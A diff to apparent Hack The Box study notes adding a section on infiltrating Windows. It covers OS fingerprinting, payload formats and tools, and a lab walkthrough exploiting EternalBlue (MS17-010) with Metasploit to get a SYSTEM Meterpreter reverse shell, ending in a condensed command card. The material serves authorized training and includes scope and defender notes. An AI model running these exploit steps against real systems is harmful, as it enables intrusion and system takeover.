@@ -7,7 +7,7 @@
 - **HTB module:** Shells & Payloads
 - **Penetration Tester path module:** 8
 - **Total sections:** 17
-- **Current detailed progress:** Sections 1, 4, and 5 / 17
+- **Current detailed progress:** Sections 1, 4, 5, and 9 / 17
 - **Primary goal:** Understand how payloads produce shell access and how shells become the command-line foothold used for later assessment work.
 
 ---
@@ -516,3 +516,442 @@ Set-MpPreference -DisableRealtimeMonitoring $false
 - [Original complete-path Shells & Payloads summary](complete-path-study-pack/knowledge-base/08-shells-payloads.md)
 - [HTB section engagement runbook template](../../../templates/htb-section-runbook-template.md)
 
+---
+
+## 9. Infiltrating Windows — Payload Generation and Delivery
+
+### Section objective
+
+Recognize Windows targets, choose a payload format that fits the delivery path, identify generation and transfer resources, validate a suspected vulnerability, configure the exploit and payload correctly, obtain a shell in an authorized HTB lab, and identify whether the resulting native shell is Command Prompt or PowerShell.
+
+> Use these procedures only inside an authorized assessment or lab. Confirm the target, scope, maintenance constraints, and callback address before running an exploit.
+
+### Engagement workflow
+
+```text
+Confirm scope
+  -> fingerprint the target
+  -> enumerate exposed services
+  -> select a plausible vulnerability
+  -> validate without exploiting
+  -> choose exploit and payload
+  -> configure RHOSTS/LHOST/LPORT
+  -> execute
+  -> verify identity and shell type
+  -> collect only authorized evidence
+  -> clean up and document
+```
+
+### Why Windows matters
+
+Windows remains common in home and enterprise environments and is closely tied to Active Directory, cloud services, Windows Subsystem for Linux, and other Microsoft infrastructure. Its broad deployment and feature set create a large attack surface. Historical Windows flaws also show why patching, protocol hardening, network segmentation, and credential protection are essential.
+
+### Prominent Windows vulnerabilities
+
+| Name | Identifier | Main component or weakness | Security significance |
+|---|---|---|---|
+| MS08-067 | MS08-067 | Windows Server service / SMB-related remote-code-execution flaw | Used by Conficker and also leveraged by Stuxnet; affected multiple Windows versions. |
+| EternalBlue | MS17-010 | SMBv1 remote code execution | Leaked in the Shadow Brokers release and used by WannaCry and NotPetya. |
+| PrintNightmare | CVE-2021-34527 and related issues | Windows Print Spooler | Can lead to remote code execution or privilege escalation under affected configurations. |
+| BlueKeep | CVE-2019-0708 | Remote Desktop Services | Pre-authentication remote code execution affecting older Windows systems. |
+| SIGRed | CVE-2020-1350 | Windows DNS server handling of SIG records | Critical remote code execution risk, especially serious when DNS runs on a domain controller. |
+| SeriousSAM / HiveNightmare | CVE-2021-36934 | Overly permissive access to registry hive data and shadow copies | Could expose SAM and other sensitive credential material to a local low-privilege user. |
+| Zerologon | CVE-2020-1472 | Netlogon cryptographic flaw | Could allow an attacker with network access to compromise a domain controller in vulnerable environments. |
+
+Do not assume a host is exploitable merely because its operating-system version falls into an affected range. Confirm patch state and use an appropriate non-destructive check first.
+
+## Windows fingerprinting
+
+### 1. ICMP TTL clue
+
+A Windows host commonly begins with a TTL such as `128` or, on some systems, `32`. The observed value may be lower because each router hop normally decrements it. TTL is therefore a clue, not proof.
+
+```bash
+ping TARGET_IP
+```
+
+Look for a reply containing a value near `ttl=128`, then corroborate it with service and OS evidence.
+
+### 2. Nmap OS detection
+
+```bash
+sudo nmap -v -O TARGET_IP
+```
+
+Important output fields include:
+
+- `Running`
+- `OS CPE`
+- `OS details`
+- Windows-associated ports such as TCP `135`, `139`, and `445`
+
+If host discovery prevents useful results, HTB suggests testing an authorized target with additional options such as `-Pn` and, where appropriate, `-A`:
+
+```bash
+sudo nmap -Pn -A TARGET_IP
+```
+
+`-Pn` skips normal host discovery and treats the target as online. `-A` enables several intrusive enumeration features, so use it only when the rules of engagement permit them.
+
+### 3. Banner enumeration
+
+```bash
+sudo nmap -v TARGET_IP --script banner.nse
+```
+
+The banner script attempts to collect identifying text from open services. Treat banners as evidence to corroborate, because services can be proxied, altered, or intentionally misleading.
+
+### Fingerprinting evidence checklist
+
+| Evidence | What it can suggest | Limitation |
+|---|---|---|
+| TTL near 128 | Likely Windows initial TTL | Routers decrement TTL; other systems can be configured similarly. |
+| TCP 135/139/445 | RPC, NetBIOS, and SMB commonly associated with Windows | These services may also appear on non-Windows systems. |
+| Nmap OS CPE/details | TCP/IP-stack-based OS estimate | Firewalls and filtered probes reduce accuracy. |
+| SMB OS discovery | Windows edition, build, hostname, workgroup/domain clues | Requires reachable SMB and may be restricted. |
+| Service banner | Product and protocol clues | Banners may be incomplete or deceptive. |
+
+Use more than one method before making an OS determination.
+
+## Windows payload formats
+
+The delivery mechanism should influence the payload format. A format that executes cleanly through one path may be unsuitable for another.
+
+| Format | Purpose and behavior | Typical authorized-testing use |
+|---|---|---|
+| DLL | Shared Windows library containing code and data used by processes | Test DLL search-order hijacking, vulnerable library loading, or another explicitly scoped DLL execution path. |
+| `.bat` | Text-based DOS/Command Prompt script | Automate native commands, enumeration, or a controlled connection sequence. |
+| `.vbs` | VBScript executed by Windows Script Host | Assess a script-based delivery or execution path where VBScript is present and permitted. |
+| `.msi` | Windows Installer package | Test installation and `msiexec` execution paths, including their privilege context. |
+| PowerShell script | `.NET`-based scripting and administration | Use cmdlets, modules, object-oriented output, and authorized automation. |
+
+### Quick answer
+
+The text-based DOS script file type asked for in Question 1 is:
+
+```text
+.bat
+```
+
+## Payload Generation
+
+These are the payload-generation resources named by HTB. The source links are preserved here so the notes remain usable during an engagement.
+
+| Resource | Source | What it provides |
+|---|---|---|
+| MSFvenom and Metasploit Framework | [rapid7/metasploit-framework](https://github.com/rapid7/metasploit-framework) | Cross-platform payload generation, vulnerability checks, exploit modules, handlers, and post-exploitation modules. |
+| Payloads All The Things | [swisskyrepo/PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings) | Payload examples, command references, and methodology cheat sheets. |
+| Mythic C2 Framework | [its-a-feature/Mythic](https://github.com/its-a-feature/Mythic) | A command-and-control framework with extensible agents and payload-generation support. |
+| Nishang | [samratashok/nishang](https://github.com/samratashok/nishang) | Offensive PowerShell scripts and utilities for authorized security testing. |
+| Darkarmour | [bats3c/darkarmour](https://github.com/bats3c/darkarmour) | A historical tool for generating obfuscated Windows binaries; verify maintenance status and laboratory compatibility before use. |
+
+### Payload-selection checklist
+
+Before generating anything, answer these questions:
+
+1. What operating system and architecture does the target use?
+2. Which execution path is actually available?
+3. Does the payload need to be staged or self-contained?
+4. Which local interface and port can receive the callback?
+5. Will the selected format survive the transfer mechanism?
+6. Does execution require user interaction, elevated privileges, or a specific runtime?
+7. Is the action explicitly permitted by the engagement scope?
+
+## Payload transfer and execution resources
+
+| Method | Direction or role | Why it is useful | Important constraint |
+|---|---|---|---|
+| Impacket | Pwnbox to or through Windows network services | Provides Python tools for SMB, WMI, Kerberos, remote execution, file access, and temporary SMB hosting. | Requires reachable services and, for many actions, valid authorization or credentials. |
+| SMB shares | Either direction | Windows-native file sharing; administrative shares such as `C$` and `ADMIN$` may support authorized administration. | Authentication, share permissions, SMB signing, and network controls matter. |
+| Metasploit exploit modules | Payload generation, staging, handler, and execution | Many modules can build, deliver, execute, and receive a payload in one workflow. | Module options must match the exact target and callback path. |
+| HTTP/S | Either direction | Frequently reachable and easy to host or request files through. | HTTPS protects transport only when certificate validation and server trust are handled correctly. |
+| FTP/TFTP | Either direction | May be available on legacy or specialized systems. | Often unencrypted; credentials and file contents may be exposed. |
+| Payloads All The Things | Reference | Provides transfer one-liners and methodology examples. | Adapt commands to the scoped environment; do not execute unreviewed code blindly. |
+
+## HTB example compromise walkthrough
+
+This walkthrough records the lab process taught in the section. Replace every example address with the current HTB target and your current VPN/Pwnbox address.
+
+### Variables
+
+```text
+TARGET_IP=<HTB target address>
+PWNBOX_IP=<your tun0 address>
+CALLBACK_PORT=4444
+```
+
+Find the Pwnbox VPN address with:
+
+```bash
+ip -br address show tun0
+```
+
+### Step 1 — Enumerate the target
+
+HTB's example uses:
+
+```bash
+nmap -v -A TARGET_IP
+```
+
+Record:
+
+- Windows version/build estimate
+- Hostname
+- Domain or workgroup
+- Open ports
+- Service names and versions
+- SMB security information
+- Web-server details
+
+In the example, TCP `80`, `135`, `139`, and `445` were open; the target appeared to be Windows Server 2016; and SMB was exposed.
+
+### Step 2 — Validate MS17-010 with the auxiliary scanner
+
+Start Metasploit:
+
+```bash
+msfconsole
+```
+
+Then configure the scanner:
+
+```text
+use auxiliary/scanner/smb/smb_ms17_010
+show options
+set RHOSTS TARGET_IP
+run
+```
+
+Interpretation:
+
+- `RHOSTS` is the remote target or targets being checked.
+- `RPORT` defaults to SMB on TCP `445` in this module.
+- A result such as `Host is likely VULNERABLE` is a strong indicator, not permission to exceed scope.
+- Stop if the target is not the authorized HTB machine or the module's behavior is not allowed.
+
+### Step 3 — Select the exploit
+
+Search the installed modules:
+
+```text
+search eternal
+```
+
+HTB's walkthrough selects:
+
+```text
+use exploit/windows/smb/ms17_010_psexec
+```
+
+Do not rely on a search-result number such as `use 2`; module ordering can change between Metasploit versions. Use the full module name in engagement notes.
+
+### Step 4 — Configure exploit and payload
+
+```text
+show options
+set RHOSTS TARGET_IP
+set LHOST PWNBOX_IP
+set LPORT 4444
+show options
+```
+
+The walkthrough uses the default payload:
+
+```text
+windows/meterpreter/reverse_tcp
+```
+
+If it is not already selected, set it explicitly:
+
+```text
+set PAYLOAD windows/meterpreter/reverse_tcp
+```
+
+#### Meaning of the critical settings
+
+| Setting | Meaning | Common mistake |
+|---|---|---|
+| `RHOSTS` | Remote target address | Entering the Pwnbox IP instead of the target. |
+| `RPORT` | Remote service port, normally `445` here | Changing it when SMB is actually on the default port. |
+| `LHOST` | Local callback/listener address reachable by the target | Using `127.0.0.1`, a Wi-Fi address, or the wrong VPN interface instead of `tun0`. |
+| `LPORT` | Local port used by the reverse connection | Choosing a blocked or already occupied port. |
+| `PAYLOAD` | Code and session type delivered after exploitation | Selecting a payload with the wrong platform or architecture. |
+
+Before execution, inspect `show options` and make sure every required field is valid.
+
+### Step 5 — Execute and verify the Meterpreter session
+
+```text
+exploit
+```
+
+When a session opens, verify its identity:
+
+```text
+getuid
+sysinfo
+```
+
+HTB's example obtained:
+
+```text
+NT AUTHORITY\SYSTEM
+```
+
+Do not assume the privilege level; record the actual `getuid` result.
+
+### Step 6 — Open and identify the native Windows shell
+
+From Meterpreter:
+
+```text
+shell
+```
+
+Prompt recognition:
+
+| Prompt | Shell |
+|---|---|
+| `C:\Windows\system32>` | Command Prompt (`cmd.exe`) |
+| `PS C:\Windows\system32>` | PowerShell |
+
+Useful verification commands in Command Prompt:
+
+```cmd
+whoami
+hostname
+cd
+```
+
+### Step 7 — Read the HTB flag
+
+Question 3 places `flag.txt` at the root of `C:\`. From the native Windows shell:
+
+```cmd
+type C:\flag.txt
+```
+
+Submit the displayed value to HTB. Do not commit the flag value to the notes repository.
+
+## Command Prompt versus PowerShell
+
+| Characteristic | Command Prompt | PowerShell |
+|---|---|---|
+| Data model | Primarily text streams | `.NET` objects |
+| Automation | Batch files and native DOS/Windows commands | Cmdlets, functions, scripts, modules, and pipelines |
+| Compatibility | Available on old and current Windows versions | Not native to very old Windows versions; version and policy vary |
+| Logging and visibility | Still observable through process, command-line, and security telemetry | Often creates richer PowerShell-specific telemetry and history |
+| Typical choice | Simple native commands, batch workflows, older hosts | Structured administration, `.NET`, custom modules, and cloud services |
+
+Use Command Prompt when:
+
+- The target is old and may not include PowerShell.
+- Only simple native commands or batch files are required.
+- PowerShell execution policy or version limitations interfere with the intended authorized workflow.
+
+Use PowerShell when:
+
+- Cmdlets, modules, aliases, or custom scripts are needed.
+- Structured `.NET` objects are more useful than plain text.
+- The task involves modern Windows or cloud administration.
+
+Neither shell is invisible. Modern endpoint and Windows logging can capture process creation, command lines, scripts, network connections, and related behavior.
+
+## WSL and PowerShell Core considerations
+
+- WSL provides a Linux userland on Windows and may expose Linux utilities and runtimes such as Python.
+- PowerShell Core can run on Linux and carries many PowerShell concepts across platforms.
+- Do not assume WSL or cross-platform PowerShell activity is absent from telemetry. Defensive visibility changes over time and depends on configuration.
+- Enumerate the actual host and installed components instead of relying on historical detection assumptions.
+
+## Verification checklist
+
+- [ ] Target address matches the authorized HTB instance.
+- [ ] Windows identification is supported by more than one clue.
+- [ ] Open services and versions are recorded.
+- [ ] The vulnerability is checked before exploitation.
+- [ ] `RHOSTS` points to the target.
+- [ ] `LHOST` points to the reachable Pwnbox/VPN interface.
+- [ ] `LPORT` is available and allowed.
+- [ ] Payload platform and architecture match the target.
+- [ ] Session identity is verified with `getuid` or `whoami`.
+- [ ] Native shell type is identified from the prompt and behavior.
+- [ ] Only the minimum evidence required by the exercise is collected.
+- [ ] The flag is submitted to HTB but never stored in public notes.
+
+## Troubleshooting
+
+| Symptom | Likely cause | Check or correction |
+|---|---|---|
+| Nmap reports the host as down | ICMP or discovery probes are filtered | Confirm the address and, if authorized, retry with `-Pn`. |
+| OS detection is unclear | Insufficient open/closed ports or filtered probes | Combine TTL, service banners, SMB enumeration, and version evidence. |
+| MS17-010 scanner returns no result | TCP 445 is closed/filtered, target is patched, or wrong address | Recheck scope, reachability, port state, and module settings. |
+| Exploit has no session | Wrong `LHOST`, blocked callback, occupied `LPORT`, incompatible exploit/payload, or patched target | Verify `tun0`, routing, listener settings, target build, and module output. |
+| Session opens and immediately dies | Payload instability, process termination, endpoint controls, or network interruption | Review module output, confirm target state, and retry only when the lab permits it. |
+| `type C:\flag.txt` fails | Wrong shell, wrong path, or insufficient access | Run `whoami`, `cd`, and `dir C:\`; confirm the lab's current instructions. |
+
+## Detection and defender observations
+
+The section's workflow can create high-value telemetry, including:
+
+- Scanning across many ports and Nmap probe signatures
+- SMB vulnerability-check traffic
+- Connections to TCP 445 from unusual systems
+- Remote service creation or access to administrative shares
+- PowerShell execution and script-block telemetry
+- A reverse TCP connection from the target to the Pwnbox
+- Meterpreter staging and process creation
+- A process running as `NT AUTHORITY\SYSTEM`
+
+Defenders should patch affected systems, disable SMBv1 where it is not required, restrict SMB exposure, monitor administrative shares and service creation, segment critical servers, and alert on unusual outbound callbacks.
+
+## Cleanup and documentation
+
+After the authorized lab activity:
+
+1. Exit the native shell with `exit` to return to Meterpreter.
+2. Exit the Meterpreter session when evidence collection is complete.
+3. Stop Metasploit handlers and modules.
+4. Remove only artifacts that the exercise caused and that the rules authorize you to remove.
+5. Record the target, timestamp, module, payload, callback address, session identity, evidence, and cleanup result.
+6. Never add credentials, flags, client data, or live payload binaries to the public notes repository.
+
+## Section questions
+
+| Question | Answer or procedure |
+|---|---|
+| Text-based DOS script file extension | `.bat` |
+| Windows exploit included in the Shadow Brokers leak | `MS17-010` |
+| Flag in `C:\flag.txt` | Gain the authorized HTB shell, run `type C:\flag.txt`, and submit the value only to HTB. |
+
+## Fast engagement card
+
+```text
+# Fingerprint
+ping TARGET_IP
+sudo nmap -v -O TARGET_IP
+sudo nmap -v TARGET_IP --script banner.nse
+
+# Validate MS17-010 in Metasploit
+use auxiliary/scanner/smb/smb_ms17_010
+set RHOSTS TARGET_IP
+run
+
+# Configure HTB's example exploit
+use exploit/windows/smb/ms17_010_psexec
+set RHOSTS TARGET_IP
+set LHOST PWNBOX_IP
+set LPORT 4444
+set PAYLOAD windows/meterpreter/reverse_tcp
+show options
+exploit
+
+# Verify and read the exercise flag
+getuid
+sysinfo
+shell
+whoami
+hostname
+type C:\flag.txt
+```
